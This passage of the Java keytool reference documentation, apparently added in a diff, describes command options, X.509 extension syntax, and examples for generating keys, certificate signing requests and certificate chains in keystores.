+env: Retrieve the password from the environment variable named argument.
+
+file: Retrieve the password from the file named argument.
+
+Note: All other options that require passwords, such as -keypass, -srckeypass, -destkeypass, -srcstorepass, and -deststorepass, accept the env and file modifiers. Remember to separate the password option and the modifier with a colon (:).
+
+The password must be provided to all commands that access the keystore contents. For such commands, when the -storepass option is not provided at the command line, the user is prompted for it.
+
+When retrieving information from the keystore, the password is optional. If no password is specified, then the integrity of the retrieved information cannot be verified and a warning is displayed.
+
+-providername provider_name
+Used to identify a cryptographic service provider's name when listed in the security properties file.
+
+-providerclass provider_class_name
+Used to specify the name of a cryptographic service provider's master class file when the service provider is not listed in the security properties file.
+
+-providerarg provider_arg
+Used with the -providerclass option to represent an optional string input argument for the constructor of provider_class_name.
+
+-protected
+Either true or false. This value should be specified as true when a password must be specified by way of a protected authentication path such as a dedicated PIN reader.Because there are two keystores involved in the -importkeystore command, the following two options -srcprotected and -destprotected are provided for the source keystore and the destination keystore respectively.
+
+-ext {name{:critical} {=value}}
+Denotes an X.509 certificate extension. The option can be used in -genkeypair and -gencert to embed extensions into the certificate generated, or in -certreq to show what extensions are requested in the certificate request. The option can appear multiple times. The name argument can be a supported extension name (see Named Extensions) or an arbitrary OID number. The value argument, when provided, denotes the argument for the extension. When value is omitted, that means that the default value of the extension or the extension requires no argument. The :critical modifier, when provided, means the extension's isCritical attribute is true; otherwise, it is false. You can use :c in place of :critical.
+
+Named Extensions
+The keytool command supports these named extensions. The names are not case-sensitive).
+
+BC or BasicConstraints
+Values: The full form is: ca:{true|false}[,pathlen:<len>] or <len>, which is short for ca:true,pathlen:<len>. When <len> is omitted, you have ca:true.
+
+KU or KeyUsage
+Values: usage(,usage)*, where usage can be one of digitalSignature, nonRepudiation (contentCommitment), keyEncipherment, dataEncipherment, keyAgreement, keyCertSign, cRLSign, encipherOnly, decipherOnly. The usage argument can be abbreviated with the first few letters (dig for digitalSignature) or in camel-case style (dS for digitalSignature or cRLS for cRLSign), as long as no ambiguity is found. The usage values are case-sensitive.
+
+EKU or ExtendedKeyUsage
+Values: usage(,usage)*, where usage can be one of anyExtendedKeyUsage, serverAuth, clientAuth, codeSigning, emailProtection, timeStamping, OCSPSigning, or any OID string. The usage argument can be abbreviated with the first few letters or in camel-case style, as long as no ambiguity is found. The usage values are case-sensitive.
+
+SAN or SubjectAlternativeName
+Values: type:value(,type:value)*, where type can be EMAIL, URI, DNS, IP, or OID. The value argument is the string format value for the type.
+
+IAN or IssuerAlternativeName
+Values: Same as SubjectAlternativeName.
+
+SIA or SubjectInfoAccess
+Values: method:location-type:location-value (,method:location-type:location-value)*, where method can be timeStamping, caRepository or any OID. The location-type and location-value arguments can be any type:value supported by the SubjectAlternativeName extension.
+
+AIA or AuthorityInfoAccess
+Values: Same as SubjectInfoAccess. The method argument can be ocsp,caIssuers, or any OID.
+
+When name is OID, the value is the hexadecimal dumped DER encoding of the extnValue for the extension excluding the OCTET STRING type and length bytes. Any extra character other than standard hexadecimal numbers (0-9, a-f, A-F) are ignored in the HEX string. Therefore, both 01:02:03:04 and 01020304 are accepted as identical values. When there is no value, the extension has an empty value field.
+
+A special name honored, used in -gencert only, denotes how the extensions included in the certificate request should be honored. The value for this name is a comma separated list of all (all requested extensions are honored), name{:[critical|non-critical]} (the named extension is honored, but using a different isCritical attribute) and -name (used with all, denotes an exception). Requested extensions are not honored by default.
+
+If, besides the -ext honored option, another named or OID -ext option is provided, this extension is added to those already honored. However, if this name (or OID) also appears in the honored value, then its value and criticality overrides the one in the request.
+
+The subjectKeyIdentifier extension is always created. For non-self-signed certificates, the authorityKeyIdentifier is created.
+
+Note: Users should be aware that some combinations of extensions (and other certificate fields) may not conform to the Internet standard. See Certificate Conformance Warning.
+
+Commands
+-gencert
+{-rfc}: Output in RFC (Request For Comment) style
+
+{-infile infile}: Input file name
+
+{-outfile outfile}: Output file name
+
+{-alias alias}: Alias name of the entry to process
+
+{-sigalg sigalg}: Signature algorithm name
+
+{-dname dname}: Distinguished name
+
+{-startdate startdate}: Certificate validity start date and time
+
+{-ext ext}*: X.509 extension
+
+{-validity days}: Validity number of days
+
+[-keypass arg]: Key password
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument. For example, if MyProvider is a legacy provider loaded via reflection,
+
+keytool -providerclass com.example.MyProvider ...
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Generates a certificate as a response to a certificate request file (which can be created by the keytool -certreq command). The command reads the request from infile (if omitted, from the standard input), signs it using alias's private key, and outputs the X.509 certificate into outfile (if omitted, to the standard output). When-rfc is specified, the output format is Base64-encoded PEM; otherwise, a binary DER is created.
+
+The sigalg value specifies the algorithm that should be used to sign the certificate. The startdate argument is the start time and date that the certificate is valid. The valDays argument tells the number of days for which the certificate should be considered valid.
+
+When dname is provided, it is used as the subject of the generated certificate. Otherwise, the one from the certificate request is used.
+
+The ext value shows what X.509 extensions will be embedded in the certificate. Read Common Options for the grammar of -ext.
+
+The -gencert option enables you to create certificate chains. The following example creates a certificate, e1, that contains three certificates in its certificate chain.
+
+The following commands creates four key pairs named ca, ca1, ca2, and e1:
+
+keytool -alias ca -dname CN=CA -genkeypair
+keytool -alias ca1 -dname CN=CA -genkeypair
+keytool -alias ca2 -dname CN=CA -genkeypair
+keytool -alias e1 -dname CN=E1 -genkeypair
+The following two commands create a chain of signed certificates; ca signs ca1 and ca1 signs ca2, all of which are self-issued:
+
+keytool -alias ca1 -certreq |
+    keytool -alias ca -gencert -ext san=dns:ca1 |
+    keytool -alias ca1 -importcert
+
+keytool -alias ca2 -certreq |
+    $KT -alias ca1 -gencert -ext san=dns:ca2 |
+    $KT -alias ca2 -importcert
+The following command creates the certificate e1 and stores it in the file e1.cert, which is signed by ca2. As a result, e1 should contain ca, ca1, and ca2 in its certificate chain:
+
+keytool -alias e1 -certreq | keytool -alias ca2 -gencert > e1.cert
+-genkeypair
+{-alias alias}: Alias name of the entry to process
+
+{-keyalg alg}: Key algorithm name
+
+{-keysize size}: Key bit size
+
+{-groupname name}: Group name. For example, an Elliptic Curve name
+
+{-sigalg alg}: Signature algorithm name
+
+-destalias alias: Destination alias
+
+[-dname name]: Distinguished name
+
+{-startdate date}: Certificate validity start date and time
+
+[-ext value]*: X.509 extension
+
+{-validity days}: Validity number of days
+
+[-keypass arg]: Key password
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Generates a key pair (a public key and associated private key). Wraps the public key into an X.509 v3 self-signed certificate, which is stored as a single-element certificate chain. This certificate chain and the private key are stored in a new keystore entry identified by alias.
+
+The keyalg value specifies the algorithm to be used to generate the key pair, and the keysize value specifies the size of each key to be generated. The sigalg value specifies the algorithm that should be used to sign the self-signed certificate. This algorithm must be compatible with the keyalg value.
+
+The groupname value specifies a named group when generating a key pair. The groupname option is preferred over the keysize option because there may be more than one curve of the same size. For example:
+
+keytool -genkeypair -keyalg EC -groupname secp384r1
+will generate an Elliptic Curve key pair by using the secp384r1 curve.
+
+The dname value specifies the X.500 Distinguished Name to be associated with the value of alias, and is used as the issuer and subject fields in the self-signed certificate. If no distinguished name is provided at the command line, then the user is prompted for one.
+
+The value of keypass is a password used to protect the private key of the generated key pair. If no password is provided, then the user is prompted for it. If you press the Return key at the prompt, then the key password is set to the same password as the keystore password. The keypass value must be at least 6 characters.
+
+The value of startdate specifies the issue time of the certificate, also known as the "Not Before" value of the X.509 certificate's Validity field.
+
+The option value can be set in one of these two forms:
+
+([+-]nnn[ymdHMS])+
+
+[yyyy/mm/dd] [HH:MM:SS]
+
+With the first form, the issue time is shifted by the specified value from the current time. The value is a concatenation of a sequence of subvalues. Inside each subvalue, the plus sign (+) means shift forward, and the minus sign (-) means shift backward. The time to be shifted is nnn units of years, months, days, hours, minutes, or seconds (denoted by a single character of y, m, d, H, M, or S respectively). The exact value of the issue time is calculated using the java.util.GregorianCalendar.add(int field, int amount) method on each subvalue, from left to right. For example, by specifying, the issue time will be:
+
+Calendar c = new GregorianCalendar();
+c.add(Calendar.YEAR, -1);
+c.add(Calendar.MONTH, 1);
+c.add(Calendar.DATE, -1);
+return c.getTime()
+With the second form, the user sets the exact issue time in two parts, year/month/day and hour:minute:second (using the local time zone). The user can provide only one part, which means the other part is the same as the current date (or time). The user must provide the exact number of digits as shown in the format definition (padding with 0 when shorter). When both the date and time are provided, there is one (and only one) space character between the two parts. The hour should always be provided in 24 hour format.
+
+When the option is not provided, the start date is the current time. The option can be provided at most once.
+
+The value of valDays specifies the number of days (starting at the date specified by -startdate, or the current date when -startdate is not specified) for which the certificate should be considered valid.
+
+This command was named -genkey in earlier releases. The old name is still supported in this release. The new name, -genkeypair, is preferred going forward.
+
+-genseckey
+{-alias alias}: Alias name of the entry to process
+
+[-keypass arg] : Key password
+
+{-keyalg alg}: Key algorithm name
+
+{-keysize size}: Key bit size
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Generates a secret key and stores it in a new KeyStore.SecretKeyEntry identified by alias.
+
+The value of keyalg specifies the algorithm to be used to generate the secret key, and the value of keysize specifies the size of the key to be generated. The keypass value is a password that protects the secret key. If no password is provided, then the user is prompted for it. If you press the Return key at the prompt, then the key password is set to the same password that is used for the keystore. The keypass value must be at least 6 characters.
+
+-importcert
+{-noprompt}: Do not prompt
+
+{-trustcacerts}: Trust certificates from cacerts
+
+{-protected}: Password is provided through protected mechanism
+
+{-alias alias}: Alias name of the entry to process
+
+{-file file}: Input file name
+
+[-keypass arg]: Key password
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+Reads the certificate or certificate chain (where the latter is supplied in a PKCS#7 formatted reply or a sequence of X.509 certificates) from the file cert_file, and stores it in the keystore entry identified by alias. If no file is specified, then the certificate or certificate chain is read from stdin.
+
+The keytool command can import X.509 v1, v2, and v3 certificates, and PKCS#7 formatted certificate chains consisting of certificates of that type. The data to be imported must be provided either in binary encoding format or in printable encoding format (also known as Base64 encoding) as defined by the Internet RFC 1421 standard. In the latter case, the encoding must be bounded at the beginning by a string that starts with -----BEGIN, and bounded at the end by a string that starts with -----END.
+
+You import a certificate for two reasons: To add it to the list of trusted certificates, and to import a certificate reply received from a certificate authority (CA) as the result of submitting a Certificate Signing Request to that CA (see the -certreq option in Commands).
+
+Which type of import is intended is indicated by the value of the -alias option. If the alias does not point to a key entry, then the keytool command assumes you are adding a trusted certificate entry. In this case, the alias should not already exist in the keystore. If the alias does already exist, then the keytool command outputs an error because there is already a trusted certificate for that alias, and does not import the certificate. If the alias points to a key entry, then the keytool command assumes you are importing a certificate reply.
+
+-importpassword
+{-alias alias}: Alias name of the entry to process
+
+[-keypass arg]: Key password
+
+{-keyalg alg}: Key algorithm name
+
+{-keysize size}: Key bit size
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Imports a passphrase and stores it in a new KeyStore.SecretKeyEntry identified by alias. The passphrase may be supplied via the standard input stream; otherwise the user is prompted for it. keypass is a password used to protect the imported passphrase. If no password is provided, the user is prompted for it. If you press the Return key at the prompt, the key password is set to the same password as that used for the keystore. keypass must be at least 6 characters long.
+
+-importkeystore
+{-srckeystore keystore}: Source keystore name
+
+{-destkeystore keystore}: Destination keystore name
+
+{-srcstoretype type}: Source keystore type
+
+{-deststoretype type}: Destination keystore type
+
+[-srcstorepass arg]: Source keystore password
+
+[-deststorepass arg]: Destination keystore password
+
+{-srcprotected Source keystore password protected
+
+{-srcprovidername name}: Source keystore provider name
+
+{-destprotected}: Destination keystore password protected
+
+{-destprovidername name}: Destination keystore provider name
+
+{-srcalias alias}: Source alias
+
+{-destalias alias}: Destination alias
+
+[-srckeypass arg]: Source key password
+
+[-destkeypass arg]: Destination key password
+
+{-noprompt}: Do not prompt
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+Imports a single entry or all entries from a source keystore to a destination keystore.
+
+When the -srcalias option is provided, the command imports the single entry identified by the alias to the destination keystore. If a destination alias is not provided with destalias, then srcalias is used as the destination alias. If the source entry is protected by a password, then srckeypass is used to recover the entry. If srckeypass is not provided, then the keytool command attempts to use srcstorepass to recover the entry. If srcstorepass is either not provided or is incorrect, then the user is prompted for a password. The destination entry is protected with destkeypass. If destkeypass is not provided, then the destination entry is protected with the source entry password. For example, most third-party tools require storepass and keypass in a PKCS #12 keystore to be the same. In order to create a PKCS #12 keystore for these tools, always specify a -destkeypass to be the same as -deststorepass.
+
+If the -srcalias option is not provided, then all entries in the source keystore are imported into the destination keystore. Each destination entry is stored under the alias from the source entry. If the source entry is protected by a password, then srcstorepass is used to recover the entry. If srcstorepass is either not provided or is incorrect, then the user is prompted for a password. If a source keystore entry type is not supported in the destination keystore, or if an error occurs while storing an entry into the destination keystore, then the user is prompted whether to skip the entry and continue or to quit. The destination entry is protected with the source entry password.
+
+If the destination alias already exists in the destination keystore, then the user is prompted to either overwrite the entry or to create a new entry under a different alias name.
+
+If the -noprompt option is provided, then the user is not prompted for a new destination alias. Existing entries are overwritten with the destination alias name. Entries that cannot be imported are skipped and a warning is displayed.
+
+-printcertreq
+{-file file}: Input file name
+
+{-v}: Verbose output
+
+Prints the content of a PKCS #10 format certificate request, which can be generated by the keytool -certreq command. The command reads the request from file. If there is no file, then the request is read from the standard input.
+
+-certreq
+{-alias alias}: Alias name of the entry to process
+
+{-sigalg alg}: Signature algorithm name
+
+{-file file}: Output file name
+
+[-keypass arg]: Key password
+
+{-keystore keystore}: Keystore name
+
+{-dname name}: Distinguished name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected }: Password provided through a protected mechanism
+
+Generates a Certificate Signing Request (CSR) using the PKCS #10 format.
+
+A CSR is intended to be sent to a certificate authority (CA). The CA authenticates the certificate requestor (usually off-line) and will return a certificate or certificate chain, used to replace the existing certificate chain (which initially consists of a self-signed certificate) in the keystore.
+
+The private key associated with alias is used to create the PKCS #10 certificate request. To access the private key, the correct password must be provided. If keypass is not provided at the command line and is different from the password used to protect the integrity of the keystore, then the user is prompted for it. If dname is provided, then it is used as the subject in the CSR. Otherwise, the X.500 Distinguished Name associated with alias is used.
+
+The sigalg value specifies the algorithm that should be used to sign the CSR.
+
+The CSR is stored in the file certreq_file. If no file is specified, then the CSR is output to stdout.
+
+Use the importcert command to import the response from the CA.
+
+-exportcert
+{-rfc}: Output in RFC style
+
+{-alias alias}: Alias name of the entry to process
+
+{-file file}: Output file name
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v }: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Reads from the keystore the certificate associated with alias and stores it in the cert_file file. When no file is specified, the certificate is output to stdout.
+
+The certificate is by default output in binary encoding. If the -rfc option is specified, then the output in the printable encoding format defined by the Internet RFC 1421 Certificate Encoding Standard.
+
+If alias refers to a trusted certificate, then that certificate is output. Otherwise, alias refers to a key entry with an associated certificate chain. In that case, the first certificate in the chain is returned. This certificate authenticates the public key of the entity addressed by alias.
+
+This command was named -export in earlier releases. The old name is still supported in this release. The new name, -exportcert, is preferred going forward.
+
+-list
+{-rfc}: Output in RFC style
+
+{-alias alias}: Alias name of the entry to process
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg] }: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Prints to stdout the contents of the keystore entry identified by alias. If no alias is specified, then the contents of the entire keystore are printed.
+
+This command by default prints the SHA256 fingerprint of a certificate. If the -v option is specified, then the certificate is printed in human-readable format, with additional information such as the owner, issuer, serial number, and any extensions. If the -rfc option is specified, then the certificate contents are printed using the printable encoding format, as defined by the Internet RFC 1421 Certificate Encoding Standard.
+
+You cannot specify both -v and -rfc.
+
+-printcert
+{-rfc}: Output in RFC style
+
+{-file cert_file}: Input file name
+
+{-sslserver server[:port]}: Secure Sockets Layer (SSL) server host and port
+
+{-jarfile JAR_file}: Signed .jar file
+
+{-v}: Verbose output
+
+Reads the certificate from the file cert_file, the SSL server located at host:port, or the signed JAR file JAR_file (with the -jarfile option) and prints its contents in a human-readable format. When no port is specified, the standard HTTPS port 443 is assumed. Note that -sslserver and -file options cannot be provided at the same time. Otherwise, an error is reported. If neither option is specified, then the certificate is read from stdin.
+
+When -rfc is specified, the keytool command prints the certificate in PEM mode as defined by the Internet RFC 1421 Certificate Encoding standard. See Internet RFC 1421 Certificate Encoding Standard.
+
+If the certificate is read from a file or stdin, then it might be either binary encoded or in printable encoding format, as defined by the RFC 1421 Certificate Encoding standard.
+
+If the SSL server is behind a firewall, then the -J-Dhttps.proxyHost=proxyhost and -J-Dhttps.proxyPort=proxyport options can be specified on the command line for proxy tunneling. See Java Secure Socket Extension (JSSE) Reference Guide at
+http://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html
+
+Note: This option can be used independently of a keystore.
+
+-printcrl
+-file crl: Input file name
+
+{-v}: Verbose output
+
+Reads the Certificate Revocation List (CRL) from the file crl. A CRL is a list of digital certificates that were revoked by the CA that issued them. The CA generates the crl file.
+
+Note: This option can be used independently of a keystore.
+
+-storepasswd
+[-new arg]: New password
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+Changes the password used to protect the integrity of the keystore contents. The new password is new_storepass, which must be at least 6 characters.
+
+-keypasswd
+{-alias alias}: Alias name of the entry to process
+
+[-keypass old_keypass]: Key password
+
+[-new new_keypass]: New password
+
+{-keystore keystore}: Keystore name
+
+{-storepass arg}: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+Changes the password under which the private/secret key identified by alias is protected, from old_keypass to new_keypass, which must be at least 6 characters.
+
+If the -keypass option is not provided at the command line, and the key password is different from the keystore password, then the user is prompted for it.
+
+If the -new option is not provided at the command line, then the user is prompted for it
+
+-delete
+[-alias alias]: Alias name of the entry to process
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Deletes from the keystore the entry identified by alias. The user is prompted for the alias, when no alias is provided at the command line.
+
+-changealias
+{-alias alias}: Alias name of the entry to process
+
+[-destalias alias]: Destination alias
+
+[-keypass arg]: Key password
+
+{-keystore keystore}: Keystore name
+
+[-storepass arg]: Keystore password
+
+{-storetype type}: Keystore type
+
+{-providername name}: Provider name
+
+{-providerclass class [-providerarg arg]}: Add security provider by fully qualified class name with an optional configure argument.
+
+{-providerpath list}: Provider classpath
+
+{-v}: Verbose output
+
+{-protected}: Password provided through a protected mechanism
+
+Move an existing keystore entry from the specified alias to a new alias, destalias. If no destination alias is provided, then the command prompts for one. If the original entry is protected with an entry password, then the password can be supplied with the -keypass option. If no key password is provided, then the storepass (if provided) is attempted first. If the attempt fails, then the user is prompted for a password.
+
+-help
+Lists the basic commands and their options.
+
+For more information about a specific command, enter the following, where command_name is the name of the command: keytool -command_name -help.
+
+Examples
+This example walks through the sequence of steps to create a keystore for managing public/private key pair and certificates from trusted entities.
+
+Generate the Key Pair
+First, create a keystore and generate the key pair. You can use a command such as the following typed as a single line:
+
+keytool -genkeypair -dname "cn=Mark Jones, ou=Java, o=Oracle, c=US"
+    -alias business -keypass <new password for private key>
+    -keystore /working/mykeystore
+    -storepass <new password for keystore> -validity 180
+The command creates the keystore named mykeystore in the working directory (assuming it does not already exist), and assigns it the password specified by <new password for keystore>. It generates a public/private key pair for the entity whose distinguished name has a common name of Mark Jones, organizational unit of Java, organization of Oracle and two-letter country code of US. It uses the default DSA key generation algorithm to create the keys; both are 1024 bits.
+
+The command uses the default SHA256withRSA signature algorithm to create a self-signed certificate that includes the public key and the distinguished name information. The certificate is valid for 180 days, and is associated with the private key in a keystore entry referred to by the alias business. The private key is assigned the password specified by <new password for private key>.
+
+The command is significantly shorter when the option defaults are accepted. In this case, no options are required, and the defaults are used for unspecified options that have default values. You are prompted for any required values. You could have the following:
+
+keytool -genkeypair
+In this case, a keystore entry with the alias mykey is created, with a newly generated key pair and a certificate that is valid for 90 days. This entry is placed in the keystore named .keystore in your home directory. The keystore is created when it does not already exist. You are prompted for the distinguished name information, the keystore password, and the private key password.
+
+The rest of the examples assume you executed the -genkeypair command without options specified, and that you responded to the prompts with values equal to those specified in the first -genkeypair command. For example, a distinguished name of cn=Mark Jones, ou=Java, o=Oracle, c=US).
+
+Request a Signed Certificate from a CA
+Generating the key pair created a self-signed certificate. A certificate is more likely to be trusted by others when it is signed by a Certification Authority (CA). To get a CA signature, first generate a Certificate Signing Request (CSR), as follows:
+
+keytool -certreq -file MarkJ.csr
+This creates a CSR for the entity identified by the default alias mykey and puts the request in the file named MarkJ.csr. Submit this file to a CA, such as VeriSign. The CA authenticates you, the requestor (usually off-line), and returns a certificate, signed by them, authenticating your public key. In some cases, the CA returns a chain of certificates, each one authenticating the public key of the signer of the previous certificate in the chain.
+
+Import a Certificate for the CA
+You now need to replace the self-signed certificate with a certificate chain, where each certificate in the chain authenticates the public key of the signer of the previous certificate in the chain, up to a root CA.
+
+Before you import the certificate reply from a CA, you need one or more trusted certificates in your keystore or in the cacerts keystore file. See -importcert in Commands.
+
+If the certificate reply is a certificate chain, then you need the top certificate of the chain. The root CA certificate that authenticates the public key of the CA.
+
+If the certificate reply is a single certificate, then you need a certificate for the issuing CA (the one that signed it). If that certificate is not self-signed, then you need a certificate for its signer, and so on, up to a self-signed root CA certificate.
+
+The cacerts keystore file ships with several VeriSign root CA certificates, so you probably will not need to import a VeriSign certificate as a trusted certificate in your keystore. But if you request a signed certificate from a different CA, and a certificate authenticating that CA's public key was not added to cacerts, then you must import a certificate from the CA as a trusted certificate.
+
+A certificate from a CA is usually either self-signed or signed by another CA, in which case you need a certificate that authenticates that CA's public key. Suppose company ABC, Inc., is a CA, and you obtain a file named ABCCA.cer that is supposed to be a self-signed certificate from ABC, that authenticates that CA's public key. Be careful to ensure the certificate is valid before you import it as a trusted certificate. View it first with the keytool -printcert command or the keytool -importcert command without the -noprompt option, and make sure that the displayed certificate fingerprints match the expected ones. You can call the person who sent the certificate, and compare the fingerprints that you see with the ones that they show or that a secure public key repository shows. Only when the fingerprints are equal is it guaranteed that the certificate was not replaced in transit with somebody else's (for example, an attacker's) certificate. If such an attack takes place, and you did not check the certificate before you imported it, then you would be trusting anything the attacker has signed.
+
+If you trust that the certificate is valid, then you can add it to your keystore with the following command:
+
+keytool -importcert -alias abc -file ABCCA.cer
+This command creates a trusted certificate entry in the keystore, with the data from the file ABCCA.cer, and assigns the alias abc to the entry.
+
+Import the Certificate Reply from the CA
+After you import a certificate that authenticates the public key of the CA you submitted your certificate signing request to (or there is already such a certificate in the cacerts file), you can import the certificate reply and replace your self-signed certificate with a certificate chain. This chain is the one returned by the CA in response to your request (when the CA reply is a chain), or one constructed (when the CA reply is a single certificate) using the certificate reply and trusted certificates that are already available in the keystore where you import the reply or in the cacerts keystore file.
+
+For example, if you sent your certificate signing request to VeriSign, then you can import the reply with the following, which assumes the returned certificate is named VSMarkJ.cer:
+
+keytool -importcert -trustcacerts -file VSMarkJ.cer
+Export a Certificate That Authenticates the Public Key
+If you used the jarsigner command to sign a Java Archive (JAR) file, then clients that want to use the file will want to authenticate your signature. One way the clients can authenticate you is by first importing your public key certificate into their keystore as a trusted entry.
+
+You can export the certificate and supply it to your clients. As an example, you can copy your certificate to a file named MJ.cer with the following command that assumes the entry has an alias of mykey:
+
+keytool -exportcert -alias mykey -file MJ.cer
+With the certificate and the signed JAR file, a client can use the jarsigner command to authenticate your signature.
+
+Import Keystore
+The command importkeystore is used to import an entire keystore into another keystore, which means all entries from the source keystore, including keys and certificates, are all imported to the destination keystore within a single command. You can use this command to import entries from a different type of keystore. During the import, all new entries in the destination keystore will have the same alias names and protection passwords (for secret keys and private keys). If the keytool command cannot recover the private keys or secret keys from the source keystore, then it prompts you for a password. If it detects alias duplication, then it asks you for a new alias, and you can specify a new alias or simply allow the keytool command to overwrite the existing one.
+
+For example, to import entries from a typical JKS type keystore key.jks into a PKCS #11 type hardware-based keystore, use the command:
+
+keytool -importkeystore
+    -srckeystore key.jks -destkeystore NONE
+    -srcstoretype JKS -deststoretype PKCS11
+    -srcstorepass <src keystore password>
+    -deststorepass <destination keystore pwd>
+The importkeystore command can also be used to import a single entry from a source keystore to a destination keystore. In this case, besides the options you see in the previous example, you need to specify the alias you want to import. With the -srcalias option specified, you can also specify the destination alias name in the command line, as well as protection password for a secret/private key and the destination protection password you want. The following command demonstrates this:
+
+keytool -importkeystore
+    -srckeystore key.jks -destkeystore NONE
+    -srcstoretype JKS -deststoretype PKCS11
+    -srcstorepass <src keystore password>
+    -deststorepass <destination keystore pwd>
+    -srcalias myprivatekey -destalias myoldprivatekey
+    -srckeypass <source entry password>
+    -destkeypass <destination entry password>
+    -noprompt
+Generate Certificates for an SSL Server
+The following are keytool commands to generate key pairs and certificates for three entities: Root CA (root), Intermediate CA (ca), and SSL server (server). Ensure that you store all the certificates in the same keystore. In these examples, RSA is the recommended the key algorithm.
+
+keytool -genkeypair -keystore root.jks -alias root -ext bc:c
+keytool -genkeypair -keystore ca.jks -alias ca -ext bc:c
+keytool -genkeypair -keystore server.jks -alias server
+ 
+keytool -keystore root.jks -alias root -exportcert -rfc > root.pem
+ 
+keytool -storepass <storepass> -keystore ca.jks -certreq -alias ca |
+    keytool -storepass <storepass> -keystore root.jks
+    -gencert -alias root -ext BC=0 -rfc > ca.pem
+keytool -keystore ca.jks -importcert -alias ca -file ca.pem
+ 
+keytool -storepass <storepass> -keystore server.jks -certreq -alias server |
+    keytool -storepass <storepass> -keystore ca.jks -gencert -alias ca
+    -ext ku:c=dig,kE -rfc > server.pem
+cat root.pem ca.pem server.pem |
+    keytool -keystore server.jks -importcert -alias server
+Terms
+Keystore
+A keystore is a storage facility for cryptographic keys and certificates.
+
+Keystore entries
+Keystores can have different types of entries. The two most applicable entry types for the keytool command include the following:
+
+Key entries: Each entry holds very sensitive cryptographic key information, which is stored in a protected format to prevent unauthorized access. Typically, a key stored in this type of entry is a secret key, or a private key accompanied by the certificate chain for the corresponding public key. See Certificate Chains. The keytool command can handle both types of entries, while the jarsigner tool only handles the latter type of entry, that is private keys and their associated certificate chains.
+
+Trusted certificate entries: Each entry contains a single public key certificate that belongs to another party. The entry is called a trusted certificate because the keystore owner trusts that the public key in the certificate belongs to the identity identified by the subject (owner) of the certificate. The issuer of the certificate vouches for this, by signing the certificate.
+
+KeyStore aliases
+All keystore entries (key and trusted certificate entries) are accessed by way of unique aliases.
+
+An alias is specified when you add an entity to the keystore with the -genseckey command to generate a secret key, the -genkeypair command to generate a key pair (public and private key), or the -importcert command to add a certificate or certificate chain to the list of trusted certificates. Subsequent keytool commands must use this same alias to refer to the entity.
+
+For example, you can use the alias duke to generate a new public/private key pair and wrap the public key into a self-signed certificate with the following command. See Certificate Chains.
+
+keytool -genkeypair -alias duke -keypass dukekeypasswd
+This example specifies an initial password of dukekeypasswd required by subsequent commands to access the private key associated with the alias duke. If you later want to change Duke's private key password, use a command such as the following:
+
+keytool -keypasswd -alias duke -keypass dukekeypasswd -new newpass
+This changes the password from dukekeypasswd to newpass. A password should not be specified on a command line or in a script unless it is for testing purposes, or you are on a secure system. If you do not specify a required password option on a command line, then you are prompted for it.
+
+KeyStore implementation
